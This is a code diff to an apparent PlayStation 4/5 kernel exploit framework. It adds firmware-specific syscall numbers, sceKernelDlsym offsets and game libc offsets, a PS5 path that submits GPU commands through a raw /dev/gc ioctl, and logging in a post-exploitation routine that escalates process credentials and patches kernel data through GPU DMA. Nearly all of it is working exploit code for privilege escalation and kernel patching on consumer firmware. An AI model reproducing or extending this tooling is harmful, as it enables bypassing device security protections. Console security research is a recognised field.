@@ -1026,6 +1026,8 @@ SELECTED_KERNEL_VERSION_OFFSETS = (
 if SELECTED_KERNEL_VERSION_OFFSETS is None:
     raise Exception("Unsupported kernel version: %s" % sc.version)
 
+SYSCALL["open"] = 5
+SYSCALL["ioctl"] = 0x36
 SYSCALL["unlink"] = 0xA
 SYSCALL["pipe"] = 42
 SYSCALL["getpid"] = 20
@@ -1045,6 +1047,7 @@ SYSCALL["mmap"] = 477
 SYSCALL["cpuset_getaffinity"] = 0x1E7
 SYSCALL["cpuset_setaffinity"] = 0x1E8
 SYSCALL["jitshm_create"] = 0x215
+SYSCALL["jitshm_alias"] = 0x216
 SYSCALL["evf_create"] = 0x21A
 SYSCALL["evf_delete"] = 0x21B
 SYSCALL["evf_set"] = 0x220
@@ -1062,8 +1065,10 @@ SYSCALL["kexec"] = 0x295
 
 LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["setjmp"] = 0xB07E0
 LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["setjmp"] = 0xB07E0
+LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS5"]["setjmp"] = 0x58F80
 LIBC_OFFSETS["A YEAR OF SPRINGS"]["PS4"]["longjmp"] = 0xB0830
 LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS4"]["longjmp"] = 0xB0830
+LIBC_OFFSETS["Arcade Spirits: The New Challengers"]["PS5"]["longjmp"] = 0x58FD0
 
 
 # sys/socket.h
@@ -1127,6 +1132,37 @@ GPU_READ = 0x10
 GPU_WRITE = 0x20
 
 LIBKERNEL_HANDLE = 0x2001
+
+# sceKernelDlsym offsets in libkernel, per firmware (from Y2JB)
+DLSYM_OFFSETS = {
+    "4.03": 0x317D0,
+    "4.50": 0x317D0,
+    "4.51": 0x317D0,
+    "5.00": 0x32160,
+    "5.02": 0x32160,
+    "5.10": 0x32160,
+    "5.50": 0x32230,
+    "6.00": 0x330A0,
+    "6.02": 0x330A0,
+    "6.50": 0x33110,
+    "7.00": 0x33E90,
+    "7.01": 0x33E90,
+    "7.20": 0x33ED0,
+    "7.40": 0x33ED0,
+    "7.60": 0x33ED0,
+    "7.61": 0x33ED0,
+    "8.00": 0x342E0,
+    "8.20": 0x342E0,
+    "8.40": 0x342E0,
+    "8.60": 0x342E0,
+    "9.00": 0x350E0,
+    "9.05": 0x350E0,
+    "9.20": 0x350E0,
+    "9.40": 0x350E0,
+    "9.60": 0x350E0,
+    "10.00": 0x349C0,
+    "10.01": 0x349C0,
+}
 
 # max number of requests that can be created/polled/canceled/deleted/waited
 MAX_AIO_IDS = 0x80
@@ -2804,14 +2840,33 @@ def dangerous_virt_to_phys(virt_addr, cr3=kernel.kernel_cr3_addr):
     return cpu_walk_pt(cr3, virt_addr)
 
 
+def _get_dlsym_func():
+    fw = sc.version
+    if fw not in DLSYM_OFFSETS:
+        raise Exception("sceKernelDlsym offset not known for firmware %s" % fw)
+    return sc.make_function_if_needed(
+        "sceKernelDlsym", sc.libkernel_addr + DLSYM_OFFSETS[fw]
+    )
+
+
 def dangerous_dlsym(handle, symbol):
+    debug_log("dangerous_dlsym(0x%x, %s)" % (handle, symbol))
     out_buf = alloc(8)
 
-    if u64_to_i64(sc.syscalls.dlsym(handle, symbol, out_buf)) == -1:
-        raise Exception(
-            "dlsym error: %d\n%s"
-            % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
-        )
+    if sc.platform == "ps5":
+        dlsym_func = _get_dlsym_func()
+        debug_log("  calling sceKernelDlsym at 0x%x" % dlsym_func.func_addr)
+        if u64_to_i64(dlsym_func(handle, symbol, out_buf)) == -1:
+            raise Exception(
+                "dlsym error: %d\n%s"
+                % (dlsym_func.errno, dlsym_func.get_error_string())
+            )
+    else:
+        if u64_to_i64(sc.syscalls.dlsym(handle, symbol, out_buf)) == -1:
+            raise Exception(
+                "dlsym error: %d\n%s"
+                % (sc.syscalls.dlsym.errno, sc.syscalls.dlsym.get_error_string())
+            )
 
     return struct.unpack("<Q", out_buf[0:8])[0]
 
@@ -2848,10 +2903,11 @@ def find_mod_by_name(name):
 
 
 class GPU(object):
+    O_RDWR = 0x2
+    IOCTL_GC_SUBMIT = 0xC0108102
+
     def __init__(self):
         self.dmem_size = 2 * 0x100000
-
-        libSceGnmDriver, _ = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
 
         # put these into global to make life easier
         self.sceKernelAllocateMainDirectMemory = sc.make_function_if_needed(
@@ -2862,13 +2918,23 @@ class GPU(object):
             "sceKernelMapDirectMemory",
             dangerous_dlsym(LIBKERNEL_HANDLE, "sceKernelMapDirectMemory"),
         )
-        self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
-            "sceGnmSubmitCommandBuffers",
-            dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers"),
-        )
-        self.sceGnmSubmitDone = sc.make_function_if_needed(
-            "sceGnmSubmitDone", dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
-        )
+
+        if sc.platform == "ps5":
+            # open /dev/gc for direct GPU command submission
+            gc_path = alloc(8)
+            gc_path[0:8] = b"/dev/gc\x00"
+            self.gc_fd = u64_to_i64(sc.syscalls.open(gc_path, self.O_RDWR))
+            if self.gc_fd == -1:
+                raise Exception("failed to open /dev/gc: %d" % sc.syscalls.open.errno)
+        else:
+            libSceGnmDriver, _ = find_mod_by_name("libSceGnmDriverForNeoMode.sprx")
+            self.sceGnmSubmitCommandBuffers = sc.make_function_if_needed(
+                "sceGnmSubmitCommandBuffers",
+                dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitCommandBuffers"),
+            )
+            self.sceGnmSubmitDone = sc.make_function_if_needed(
+                "sceGnmSubmitDone", dangerous_dlsym(libSceGnmDriver, "sceGnmSubmitDone")
+            )
 
         prot_ro = PROT_READ | PROT_WRITE | GPU_READ
         prot_rw = prot_ro | GPU_WRITE
@@ -2942,35 +3008,60 @@ class GPU(object):
 
         return pm4
 
-    def submit_dma_data_command(self, dest_va, src_va, size):
-        dcb_count = 1
-        dcb_gpu_addr = alloc(dcb_count * 8)
-        dcb_sizes_in_bytes = alloc(dcb_count * 4)
+    def build_command_descriptor(self, gpu_addr, size_in_bytes):
+        size_in_dwords = size_in_bytes >> 2
+        desc = alloc(16)
+        # first qword: (gpu_addr_low32 << 32) | 0xC0023F00
+        qword0 = ((gpu_addr & 0xFFFFFFFF) << 32) | 0xC0023F00
+        # second qword: (size_in_dwords << 32) | (gpu_addr_high16)
+        qword1 = ((size_in_dwords & 0xFFFFF) << 32) | ((gpu_addr >> 32) & 0xFFFF)
+        desc[0:8] = struct.pack("<Q", qword0)
+        desc[8:16] = struct.pack("<Q", qword1)
+        return desc
 
+    def ioctl_submit_commands(self, pipe_id, cmd_count, cmd_descriptors_addr):
+        # ioctl 0xC0108102
+        # struct: [dword pipe_id][dword count][qword cmd_buf_ptr]
+        submit_struct = alloc(0x10)
+        submit_struct[0:4] = struct.pack("<I", pipe_id)
+        submit_struct[4:8] = struct.pack("<I", cmd_count)
+        submit_struct[8:16] = struct.pack("<Q", cmd_descriptors_addr)
+        ret = u64_to_i64(sc.syscalls.ioctl(self.gc_fd, self.IOCTL_GC_SUBMIT, submit_struct))
+        if ret == -1:
+            raise Exception("ioctl submit failed: errno %d" % sc.syscalls.ioctl.errno)
+
+    def submit_dma_data_command(self, dest_va, src_va, size):
         # prep command buf
         dma_data = self.pm4_dma_data(dest_va, src_va, size)
         sc.mem[self.cmd_va - 0x1000 : self.cmd_va - 0x1000 + len(dma_data)] = dma_data
 
-        # prep param
-        dcb_gpu_addr[0:8] = struct.pack("<Q", self.cmd_va)
-        dcb_sizes_in_bytes[0:4] = struct.pack("<I", len(dma_data))
+        if sc.platform == "ps5":
+            # use /dev/gc ioctl
+            desc = self.build_command_descriptor(self.cmd_va, len(dma_data))
+            self.ioctl_submit_commands(0, 1, get_ref_addr(desc))
+            # wait for GPU completion
+            nanosleep(500000000)
+        else:
+            dcb_count = 1
+            dcb_gpu_addr = alloc(dcb_count * 8)
+            dcb_sizes_in_bytes = alloc(dcb_count * 4)
 
-        # submit to gpu
+            dcb_gpu_addr[0:8] = struct.pack("<Q", self.cmd_va)
+            dcb_sizes_in_bytes[0:4] = struct.pack("<I", len(dma_data))
 
-        ret = self.sceGnmSubmitCommandBuffers(
-            dcb_count,
-            dcb_gpu_addr,
-            dcb_sizes_in_bytes,
-            0,
-            0,
-        )
-        if ret != 0:
-            raise Exception("sceGnmSubmitCommandBuffers error: %s" % hex(ret))
+            ret = self.sceGnmSubmitCommandBuffers(
+                dcb_count,
+                dcb_gpu_addr,
+                dcb_sizes_in_bytes,
+                0,
+                0,
+            )
+            if ret != 0:
+                raise Exception("sceGnmSubmitCommandBuffers error: %s" % hex(ret))
 
-        # inform gpu that current submission is done
-        ret = self.sceGnmSubmitDone(0)
-        if ret != 0:
-            raise Exception("sceGnmSubmitDone error: %s" % hex(ret))
+            ret = self.sceGnmSubmitDone(0)
+            if ret != 0:
+                raise Exception("sceGnmSubmitDone error: %s" % hex(ret))
 
     def transfer_physical_buffer(self, phys_addr, size, is_write=False):
         trunc_phys_addr = phys_addr & ~(self.dmem_size - 1)
@@ -3818,17 +3909,20 @@ def post_exploitation_ps5():
 
         debug_log("debug menu enabled")
 
+    debug_log("getting additional kernel addresses...")
     get_additional_kernel_address()
 
     # patch current process creds
+    debug_log("escalating curproc...")
     escalate_curproc()
 
+    debug_log("finding additional offsets...")
     find_additional_offsets()
-
-    gpu = GPU()
 
     major_version = int(sc.version.split(".")[0])
     if major_version >= 7:
+        debug_log("creating GPU object...")
+        gpu = GPU()
         debug_log("applying patches to kernel data (with GPU DMA method)")
         apply_patches_to_kernel_data(gpu)
     else:
